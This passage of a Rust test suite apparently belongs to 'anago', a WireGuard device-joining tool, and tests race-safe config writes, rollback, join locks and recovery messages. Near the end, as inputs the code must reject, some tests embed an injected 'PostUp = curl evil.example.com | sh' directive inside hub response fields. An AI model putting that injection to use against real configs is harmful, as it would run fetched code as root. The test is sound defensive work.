        }
    }

    impl TempDirs {
        /// A handle on the client directory, as `run` would hold.
        fn dir(&self) -> fsutil::DirHandle {
            fsutil::DirHandle::open(self.client.dir()).expect("the temp config directory")
        }
    }

    impl Drop for TempDirs {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.root);
        }
    }

    fn profile_of(config: &DeviceConfig) -> ClientProfile {
        config
            .profile(PrivateKey::new("ZGV2aWNlIHByaXZhdGU="))
            .unwrap()
    }

    #[test]
    #[cfg(unix)] // exercises unix modes/ownership/symlinks
    fn root_will_not_make_or_take_a_directory_in_somebody_s_home() {
        let dirs = TempDirs::new();
        let me = unsafe { libc::getuid() };
        let user = InvokingUser {
            uid: me,
            gid: unsafe { libc::getgid() },
            home: None,
        };

        // The directory exists and is mine: fine.
        assert!(prepare_client_dir(&dirs.client, Some(&user)).is_ok());

        // Missing: anago says to make it rather than making it as root.
        let missing = ClientPaths::new(dirs.root.join("not-there"));
        let e = prepare_client_dir(&missing, Some(&user)).unwrap_err();
        assert!(matches!(e, JoinError::NoConfigDir(_)), "{e:?}");
        assert!(e.to_string().contains("mkdir -p"), "{e}");
        assert!(!missing.dir().exists(), "nothing was created");

        // Somebody else's directory is not ours to write into.
        let other = InvokingUser {
            uid: me + 1,
            gid: user.gid,
            home: None,
        };
        assert!(matches!(
            prepare_client_dir(&dirs.client, Some(&other)),
            Err(JoinError::UnsafeConfigDir(_))
        ));

        // Without sudo, the directory is the person's own to create.
        let mine = ClientPaths::new(dirs.root.join("plain"));
        assert!(prepare_client_dir(&mine, None).is_ok());
        assert!(mine.dir().is_dir());
    }

    #[test]
    #[cfg(unix)] // exercises unix modes/ownership/symlinks
    fn moving_the_directory_after_the_check_cannot_redirect_the_write() {
        // The race this design exists for: the person renames
        // `~/.config/anago` between the check and the write, leaving a
        // symlink to somewhere root should never touch. The handle is
        // bound to the inode that was checked, so the write follows the
        // old directory, not the new name.
        let dirs = TempDirs::new();
        let handle = fsutil::DirHandle::open(dirs.client.dir()).unwrap();

        let decoy = dirs.root.join("decoy");
        std::fs::create_dir_all(&decoy).unwrap();
        std::fs::rename(dirs.client.dir(), dirs.root.join("moved")).unwrap();
        std::os::unix::fs::symlink(&decoy, dirs.client.dir()).unwrap();

        handle
            .write_private(crate::paths::DEVICE_FILE, "{}", None)
            .expect("the held directory is still writable");

        // It landed in the directory that was checked, not the one the
        // name now points at.
        assert!(dirs
            .root
            .join("moved")
            .join(crate::paths::DEVICE_FILE)
            .exists());
        assert!(!decoy.join(crate::paths::DEVICE_FILE).exists());
    }

    #[test]
    #[cfg(unix)] // exercises unix modes/ownership/symlinks
    fn a_symlinked_config_directory_is_refused_outright() {
        let dirs = TempDirs::new();
        let elsewhere = ClientPaths::new(dirs.root.join("linked"));
        std::os::unix::fs::symlink(dirs.client.dir(), elsewhere.dir()).unwrap();

        let user = InvokingUser {
            uid: unsafe { libc::getuid() },
            gid: unsafe { libc::getgid() },
            home: None,
        };
        let e = prepare_client_dir(&elsewhere, Some(&user)).unwrap_err();
        assert!(matches!(e, JoinError::UnsafeConfigDir(_)), "{e:?}");
    }

    #[test]
    fn a_device_that_already_joined_is_not_quietly_re_joined() {
        // Rejoining would replace the token and the key while the hub
        // still lists the old peer — registered on both sides, working
        // on neither.
        let dirs = TempDirs::new();
        assert!(check_not_joined(&dirs.dir(), &dirs.client, &dirs.wg_config).is_ok());

        std::fs::write(dirs.client.device_file(), "{}").unwrap();
        let e = check_not_joined(&dirs.dir(), &dirs.client, &dirs.wg_config).unwrap_err();
        assert!(matches!(e, JoinError::AlreadyJoined { .. }), "{e:?}");
        assert!(e.to_string().contains("anago rm"), "{e}");

        // And a wg config anago did not write is not ours to replace.
        std::fs::remove_file(dirs.client.device_file()).unwrap();
        std::fs::write(&dirs.wg_config, "[Interface]\n").unwrap();
        let e = check_not_joined(&dirs.dir(), &dirs.client, &dirs.wg_config).unwrap_err();
        assert!(matches!(e, JoinError::ConfigExists(_)), "{e:?}");
    }

    #[test]
    fn publishing_writes_both_files_or_neither() {
        let dirs = TempDirs::new();
        let config = config();
        publish(
            &config,
            &profile_of(&config),
            &Destination {
                client_dir: &dirs.dir(),
                client_paths: &dirs.client,
                wg_config: &dirs.wg_config,
                owner: None,
            },
        )
        .unwrap();

        assert_eq!(
            DeviceConfig::parse(&std::fs::read_to_string(dirs.client.device_file()).unwrap())
                .unwrap(),
            config
        );
        assert!(std::fs::read_to_string(&dirs.wg_config)
            .unwrap()
            .contains("PrivateKey = ZGV2aWNlIHByaXZhdGU="));
    }

    #[test]
    fn a_failed_device_file_takes_the_wg_config_with_it() {
        // A private key on disk with no token beside it is a state
        // nothing can use and nothing can retry.
        let dirs = TempDirs::new();
        // A directory where the device file goes: the write fails after
        // the wg config succeeded.
        std::fs::create_dir_all(dirs.client.device_file()).unwrap();

        let config = config();
        let e = publish(
            &config,
            &profile_of(&config),
            &Destination {
                client_dir: &dirs.dir(),
                client_paths: &dirs.client,
                wg_config: &dirs.wg_config,
                owner: None,
            },
        )
        .unwrap_err();
        assert!(
            matches!(e, JoinError::Save { .. } | JoinError::AlreadyJoined { .. }),
            "{e:?}"
        );
        assert!(
            !dirs.wg_config.exists(),
            "the wg config must be rolled back so a retry is possible"
        );
    }

    #[test]
    fn an_already_joined_device_is_told_where_both_files_are() {
        // The two files are not neighbours — `~/.config/anago` and
        // `/etc/wireguard` — so "the config beside it" would send
        // somebody looking in the wrong directory.
        let e = JoinError::AlreadyJoined {
            device_file: "/home/jo/.config/anago/device.json".to_string(),
            wg_config: "/etc/wireguard/anago.conf".to_string(),
        };
        let message = e.to_string();
        assert!(
            message.contains("/home/jo/.config/anago/device.json"),
            "{message}"
        );
        assert!(
            message.contains("wg-quick down /etc/wireguard/anago.conf"),
            "{message}"
        );
        assert!(!message.contains("beside it"), "{message}");
        assert!(message.contains("anago rm"), "{message}");
    }

    #[test]
    fn the_device_file_being_taken_names_both_paths() {
        let dirs = TempDirs::new();
        std::fs::write(dirs.client.device_file(), "{}").unwrap();
        let e = check_not_joined(&dirs.dir(), &dirs.client, &dirs.wg_config).unwrap_err();
        match e {
            JoinError::AlreadyJoined {
                device_file,
                wg_config,
            } => {
                assert_eq!(device_file, dirs.client.device_file().display().to_string());
                assert_eq!(wg_config, dirs.wg_config.display().to_string());
            }
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn a_reservation_claims_names_and_gives_them_back_if_the_join_fails() {
        // Claiming before the POST is what turns "the disk is full
        // after the code was spent" into a plain retry.
        let dirs = TempDirs::new();
        let device_file = dirs.client.device_file();
        let handle = dirs.dir();
        {
            let _claim = Reservation::claim(&handle, &dirs.client, &dirs.wg_config, None).unwrap();
            assert!(dirs.wg_config.exists() && device_file.exists());
        }
        // Dropped without commit: nothing left behind, so the next
        // attempt starts clean.
        assert!(
            !dirs.wg_config.exists(),
            "the claim should have been released"
        );
        assert!(!device_file.exists());

        let mut claim = Reservation::claim(&handle, &dirs.client, &dirs.wg_config, None).unwrap();
        claim.commit();
        drop(claim);
        assert!(dirs.wg_config.exists(), "a committed claim stays");
    }

    #[test]
    fn a_name_somebody_else_took_is_not_claimed() {
        let dirs = TempDirs::new();
        std::fs::write(&dirs.wg_config, "someone else's interface\n").unwrap();

        let device_file = dirs.client.device_file();
        let e = Reservation::claim(&dirs.dir(), &dirs.client, &dirs.wg_config, None).unwrap_err();
        // The wg config is the one that was taken, and the error says
        // so rather than blaming the device file.
        assert!(matches!(e, JoinError::ConfigExists(_)), "{e:?}");
        assert_eq!(
            std::fs::read_to_string(&dirs.wg_config).unwrap(),
            "someone else's interface\n",
            "the existing file is untouched"
        );
        assert!(!device_file.exists(), "and nothing after it was claimed");
    }

    #[test]
    fn a_registration_that_cannot_be_saved_says_how_to_recover() {
        // The one case where the two sides disagree: the hub spent the
        // code and holds a peer this device cannot use.
        let undone = recovery_note(Undo::Done);
        assert!(undone.contains("forget this device"), "{undone}");
        assert!(undone.contains("`anago code`"), "{undone}");
        assert!(
            !undone.contains("anago rm"),
            "nothing left to remove: {undone}"
        );

        let stuck = recovery_note(Undo::Failed("macbook".to_string()));
        assert!(stuck.contains("anago rm macbook"), "{stuck}");
        assert!(stuck.contains("`anago code`"), "{stuck}");

        // Not even a name to remove: say that, rather than nothing.
        let unknown = recovery_note(Undo::Unknown);
        assert!(unknown.contains("may have registered"), "{unknown}");
        assert!(unknown.contains("anago ls"), "{unknown}");

        let e = JoinError::SavedNothing {
            what: NOTHING_SAVED,
            source: "No space left on device".to_string(),
            recovery: stuck,
        };
        let message = e.to_string();
        assert!(message.contains("registered this device"), "{message}");
        assert!(message.contains("No space left on device"), "{message}");
        assert!(message.contains("anago rm macbook"), "{message}");
    }

    #[test]
    fn an_undo_is_possible_even_when_a_later_field_is_unreadable() {
        // Regression: a good token and name with a malformed endpoint
        // used to return straight out as BadResponse, leaving the hub
        // holding a peer while the credentials to remove it were right
        // there in the body.
        let good = json::to_string(&response().to_json());
        let (name, token) = undo_credentials(&good).expect("a full answer");
        assert_eq!(name.as_str(), "macbook");
        assert_eq!(token.as_str(), "ab".repeat(32));

        // A JSON-escaped newline: readable JSON, unusable endpoint.
        let broken_endpoint = good.replace(
            r#""server_endpoint":"net.example.com:51820""#,
            r#""server_endpoint":"net.example.com:51820\nPostUp = x""#,
        );
        let answer =
            JoinResponse::from_json(&json::parse(&broken_endpoint).unwrap()).expect("decodes");
        let config = DeviceConfig::from_response("net.example.com", 443, answer);
        assert!(config.validate().is_ok(), "name and token are fine");
        assert!(
            config.profile(PrivateKey::new("k")).is_err(),
            "only the endpoint fails, and only when the profile is built"
        );
        let (name, _) = undo_credentials(&broken_endpoint).expect("still undoable");
        assert_eq!(name.as_str(), "macbook");

        // And when the body is unreadable, there is nothing to undo
        // with — which the recovery note has to admit.
        assert_eq!(undo_credentials("not json"), None);
        assert_eq!(undo_credentials(r#"{"name":"macbook"}"#), None);
        assert_eq!(undo_credentials(r#"{"name":"server","token":"x"}"#), None);
    }

    #[test]
    fn a_device_file_that_appears_during_the_claim_still_names_both_files() {
        // The race the reservation exists for: `device.json` shows up
        // between the preflight and the claim. The refusal has to carry
        // the same recovery as any other "already joined" — with both
        // paths, not an empty one.
        let dirs = TempDirs::new();
        let handle = dirs.dir();
        std::fs::write(dirs.client.device_file(), "{}").unwrap();

        let e = Reservation::claim(&handle, &dirs.client, &dirs.wg_config, None).unwrap_err();
        match &e {
            JoinError::AlreadyJoined {
                device_file,
                wg_config,
            } => {
                assert_eq!(
                    device_file,
                    &dirs.client.device_file().display().to_string()
                );
                assert_eq!(wg_config, &dirs.wg_config.display().to_string());
            }
            other => panic!("{other:?}"),
        }
        let message = e.to_string();
        assert!(
            message.contains(&format!("wg-quick down {}", dirs.wg_config.display())),
            "{message}"
        );
        assert!(!message.contains("wg-quick down \n"), "{message}");

        // The wg config claimed a moment earlier was released again.
        assert!(!dirs.wg_config.exists(), "the claim it did take is gone");
    }

    #[test]
    fn a_claim_left_by_a_killed_run_does_not_block_the_next_one() {
        // Drop never runs on SIGKILL, so the marker is what tells the
        // next attempt that these files belong to nobody.
        let dirs = TempDirs::new();
        let device_file = dirs.client.device_file();
        std::fs::write(&dirs.wg_config, CLAIM_MARKER).unwrap();
        std::fs::write(&device_file, CLAIM_MARKER).unwrap();

        assert!(
            check_not_joined(&dirs.dir(), &dirs.client, &dirs.wg_config).is_ok(),
            "an unfinished join owns nothing"
        );
        let handle = dirs.dir();
        let mut claim = Reservation::claim(&handle, &dirs.client, &dirs.wg_config, None).unwrap();
        claim.commit();
        assert!(dirs.wg_config.exists() && device_file.exists());

        // Only the marker counts. An empty file may be one a person
        // made on purpose, and no released build ever wrote one.
        assert!(!is_stale_claim(""));
        assert!(!is_stale_claim("   \n"));
        assert!(is_stale_claim(CLAIM_MARKER));
        std::fs::write(&dirs.wg_config, "").unwrap();
        let e = check_not_joined(&dirs.dir(), &dirs.client, &dirs.wg_config).unwrap_err();
        assert!(matches!(e, JoinError::ConfigExists(_)), "{e:?}");
        assert!(Reservation::claim(&dirs.dir(), &dirs.client, &dirs.wg_config, None).is_err());
        assert_eq!(
            std::fs::read_to_string(&dirs.wg_config).unwrap(),
            "",
            "an empty file a person created is not ours to take"
        );
    }

    #[test]
    fn a_real_config_is_never_mistaken_for_a_claim() {
        let dirs = TempDirs::new();
        let config = config();
        std::fs::write(dirs.client.device_file(), config.to_json_string()).unwrap();
        assert!(!is_stale_claim(&config.to_json_string()));

        let e = check_not_joined(&dirs.dir(), &dirs.client, &dirs.wg_config).unwrap_err();
        assert!(matches!(e, JoinError::AlreadyJoined { .. }), "{e:?}");
        let e = Reservation::claim(
            &dirs.dir(),
            &dirs.client,
            &dirs.root.join("unused.conf"),
            None,
        )
        .unwrap_err();
        assert!(matches!(e, JoinError::AlreadyJoined { .. }), "{e:?}");
        // And the real file is still there.
        assert_eq!(
            DeviceConfig::parse(&std::fs::read_to_string(dirs.client.device_file()).unwrap())
                .unwrap(),
            config
        );
    }

    #[test]
    fn only_one_join_can_run_on_a_device_at_a_time() {
        // Two joins would each pass the preflight, both POST, and the
        // loser's cleanup would delete the winner's config.
        let dirs = TempDirs::new();
        let held = acquire_join_lock(&dirs.dir(), None).unwrap();
        assert!(matches!(
            acquire_join_lock(&dirs.dir(), None),
            Err(JoinError::AlreadyRunning)
        ));
        assert!(JoinError::AlreadyRunning
            .to_string()
            .contains("already running"));

        drop(held);
        assert!(
            acquire_join_lock(&dirs.dir(), None).is_ok(),
            "the lock is released"
        );
    }

    #[test]
    fn a_second_join_cannot_delete_the_first_ones_files() {
        // The sequence the lock exists for, without a sleep to make it
        // happen: one join finishes, then another tries to start.
        let dirs = TempDirs::new();
        let config = config();
        let device_file = dirs.client.device_file();

        let lock = acquire_join_lock(&dirs.dir(), None).expect("first in");
        check_not_joined(&dirs.dir(), &dirs.client, &dirs.wg_config).expect("nothing there yet");
        let handle = dirs.dir();
        let mut claim =
            Reservation::claim(&handle, &dirs.client, &dirs.wg_config, None).expect("claimed");
        publish(
            &config,
            &profile_of(&config),
            &Destination {
                client_dir: &dirs.dir(),
                client_paths: &dirs.client,
                wg_config: &dirs.wg_config,
                owner: None,
            },
        )
        .expect("published");
        claim.commit();

        // A second join while the first still holds the lock.
        assert!(matches!(
            acquire_join_lock(&dirs.dir(), None),
            Err(JoinError::AlreadyRunning)
        ));
        drop(lock);

        // And once the lock is free, the finished files still stop it —
        // the claim it fails to make must not take them down with it.
        assert!(matches!(
            Reservation::claim(&dirs.dir(), &dirs.client, &dirs.wg_config, None),
            Err(JoinError::ConfigExists(_))
        ));
        assert_eq!(
            DeviceConfig::parse(&std::fs::read_to_string(&device_file).unwrap()).unwrap(),
            config
        );
        assert!(std::fs::read_to_string(&dirs.wg_config)
            .unwrap()
            .contains("PrivateKey = "));
    }

    // ------------------------------------------- untrusted hub answers

    #[test]
    fn a_hub_cannot_write_extra_directives_into_the_config() {
        // TLS says who the hub is, not that it is honest. A newline in
        // a field would otherwise become a wg-quick directive running
        // as root.
        let mut config = config();
        config.server_public_key = format!(
            "{}\nPostUp = curl evil.example.com | sh",
            config.server_public_key
        );
        let e = config.profile(PrivateKey::new("k")).unwrap_err();
        assert!(matches!(e, JoinError::BadResponse(_)), "{e:?}");

        let mut config = super::tests::config();
        config.server_endpoint =
            "net.example.com:51820\nPostUp = curl evil.example.com | sh".to_string();
        let e = config.profile(PrivateKey::new("k")).unwrap_err();
        assert!(e.to_string().contains("server endpoint"), "{e}");

        // Nothing that survives validation can carry a second line.
        let good = super::tests::config();
        let rendered = wgconf::client_config(&profile_of(&good));
        let text = rendered.expose();
        assert!(!text.contains("PostUp"), "{text}");
    }

    #[test]
    fn an_endpoint_has_to_be_a_host_and_a_port() {
        assert_eq!(
            checked_endpoint("net.example.com:51820").unwrap(),
            "net.example.com:51820"
        );
        assert_eq!(checked_endpoint("10.0.0.1:1").unwrap(), "10.0.0.1:1");
        for bad in [
            "net.example.com",
            "net.example.com:",
            ":51820",
            "net.example.com:0",
            "net.example.com:70000",
            "net.example.com:51820 extra",
            "net example.com:51820",
            "net.example.com:51820\nPostUp = x",
            "",
        ] {
            assert!(checked_endpoint(bad).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn a_nonsense_identity_is_refused_before_anything_is_written() {
        let mut config = config();
        config.name = "server".to_string();
        assert!(
            config.validate().is_err(),
            "a reserved name is not ours to store"
        );

        let mut config = super::tests::config();
        config.token = "not-a-token".to_string();
        assert!(config.validate().unwrap_err().to_string().contains("token"));

        let mut config = super::tests::config();
        config.server_address = "10.100.0.999".to_string();
        assert!(config.validate().is_err());

        assert!(super::tests::config().validate().is_ok());
    }
}
